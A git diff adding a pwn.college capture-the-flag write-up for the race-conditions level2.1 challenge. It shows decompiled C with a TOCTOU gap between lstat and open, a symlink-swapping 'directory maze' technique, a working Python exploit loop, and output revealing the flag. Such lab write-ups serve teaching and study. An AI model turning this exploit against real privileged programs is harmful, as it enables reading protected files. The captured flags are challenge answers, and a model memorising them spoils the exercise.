@@ -179,6 +179,174 @@ pwn.college{U8-2_E6AoYrIX5lnG5sdQMgCRBV.01MwQDL4ITM0EzW}
 
 &nbsp;
 
+## level2.1
+
+> Exploit a race condition with a tighter timing window to read the flag. Keep in mind that tighter timing windows in race conditions generally are harder to exploit reliably!
+
+```text
+hacker@race-conditions~level2-1:~$ /challenge/babyrace_level2.1
+###
+### Welcome to /challenge/babyrace_level2.1!
+###
+
+babyrace_level2.1: <stdin>:40: main: Assertion `argc > 1' failed.
+Aborted
+```
+
+This challenge is similar to level2.0 but with the `getchar()` pauses removed, making the race window much tighter.
+
+### Source code
+
+```c title="/challenge/babyrace_level2.1 :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  size_t v4; // rax
+  struct stat stat_buf; // [rsp+20h] [rbp-1A0h] BYREF
+  char buf[264]; // [rsp+B0h] [rbp-110h] BYREF
+  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  if ( argc <= 1 )
+    __assert_fail("argc > 1", "<stdin>", 0x28u, "main");
+  if ( strstr(argv[1], "flag") )
+  {
+    puts("Error: path contains `flag`!");
+    exit(1);
+  }
+  if ( (unsigned int)lstat((char *)argv[1], &stat_buf) == -1 )
+  {
+    puts("Error: failed to get file status!");
+    exit(1);
+  }
+  if ( (stat_buf.st_mode & 0xF000) == 40960 )
+  {
+    puts("Error: file is a symlink!");
+    exit(1);
+  }
+  v3 = open(argv[1], 0);
+  v4 = read(v3, buf, 0x100uLL);
+  write(1, buf, v4);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+### TOCTOU
+
+Same TOCTOU vulnerability as level2.0 — `lstat` and `open()` are not atomic. Without the pauses however, the race window is only microseconds wide.
+
+### Directory Maze
+
+To widen the race window, we use a **directory maze**. Instead of racing on the file directly, we pass a deep path `top/b/c/d/e/x` and swap the top-level `top` symlink between two directory trees:
+
+```text
+Real tree:  top -> a,    a/b/c/d/e/x   = real small file
+Fake tree:  top -> fake, fake/b/c/d/e/x = symlink to /flag
+```
+
+The deep path forces the kernel to resolve 5 directory levels for both `lstat` and `open()`, creating a wider window between the two syscalls. When `lstat("top/b/c/d/e/x")` runs, `top` points to `a` so it sees a real file and passes the symlink check. We then swap `top` to point to `fake` before `open()` runs, so it resolves to `fake/b/c/d/e/x` which is a symlink to `/flag`.
+
+Using `os.symlink()` and `os.remove()` directly instead of `os.system()` avoids forking a shell on every swap, keeping the timing precise.
+
+### Exploit
+
+~/script.py
+
+```python title="~/script.py" showLineNumbers
+import subprocess, time, os
+
+# Setup maze
+os.system("rm -rf a fake top")
+os.system("mkdir -p a/b/c/d/e && echo hi > a/b/c/d/e/x")
+os.system("mkdir -p fake/b/c/d/e && rm -f fake/b/c/d/e/x && ln -s /flag fake/b/c/d/e/x")
+
+print("[*] Starting exploit loop...")
+attempt = 0
+
+sleeps = [0.00001, 0.00005, 0.0001, 0.0002, 0.0005, 0.001, 0.002, 0.005]
+sleep_idx = 0
+sleep_val = sleeps[sleep_idx]
+
+while True:
+    attempt += 1
+
+    if attempt % 200 == 0:
+        sleep_idx = (sleep_idx + 1) % len(sleeps)
+        sleep_val = sleeps[sleep_idx]
+        print(f"[*] Attempt {attempt}, trying sleep={sleep_val}")
+
+    # Fast swap using os module directly (no shell fork)
+    try:
+        os.remove("top")
+    except FileNotFoundError:
+        pass
+    os.symlink("a", "top")
+
+    proc = subprocess.Popen(
+        ["/challenge/babyrace_level2.1", "top/b/c/d/e/x"],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT
+    )
+
+    time.sleep(sleep_val)
+
+    # Fast swap to fake
+    try:
+        os.remove("top")
+    except FileNotFoundError:
+        pass
+    os.symlink("fake", "top")
+
+    out = proc.stdout.read()
+    proc.wait()
+
+    if b"pwn.college" in out:
+        print(f"[+] Got the flag with sleep={sleep_val}!")
+        print(out.decode(errors='replace'))
+        break
+```
+
+```text
+hacker@race-conditions~level2-1:~$ python3 ~/script.py
+[*] Starting exploit loop...
+[*] Attempt 200, trying sleep=5e-05
+[*] Attempt 400, trying sleep=0.0001
+[*] Attempt 600, trying sleep=0.0002
+[*] Attempt 800, trying sleep=0.0005
+[*] Attempt 1000, trying sleep=0.001
+[*] Attempt 1200, trying sleep=0.002
+[*] Attempt 1400, trying sleep=0.005
+[*] Attempt 1600, trying sleep=1e-05
+[*] Attempt 1800, trying sleep=5e-05
+[*] Attempt 2000, trying sleep=0.0001
+[*] Attempt 2200, trying sleep=0.0002
+[*] Attempt 2400, trying sleep=0.0005
+[*] Attempt 2600, trying sleep=0.001
+[*] Attempt 2800, trying sleep=0.002
+[*] Attempt 3000, trying sleep=0.005
+[*] Attempt 3200, trying sleep=1e-05
+[*] Attempt 3400, trying sleep=5e-05
+[*] Attempt 3600, trying sleep=0.0001
+[*] Attempt 3800, trying sleep=0.0002
+[*] Attempt 4000, trying sleep=0.0005
+[+] Got the flag with sleep=0.0005!
+###
+### Welcome to /challenge/babyrace_level2.1!
+###
+pwn.college{gTJklkAFDSH2ncV-d5qjjCGPR3u.0FNwQDL4ITM0EzW}
+### Goodbye!
+```
+
+&nbsp;
+
 ## level3.0
 
 > Exploit a race condition to corrupt memory, affecting the behavior of the challenge.
@@ -400,7 +568,8 @@ pwn.college{YjdXcuUWNbwI3UnjvP86hY7QNs8.0VNwQDL4ITM0EzW}
 
 &nbsp;
 
-## level3.1[​](#level31 "Direct link to level3.1")
+## level3.1
+
 > Exploit a race condition to corrupt memory, affecting the behavior of the challenge.
 
 ```text
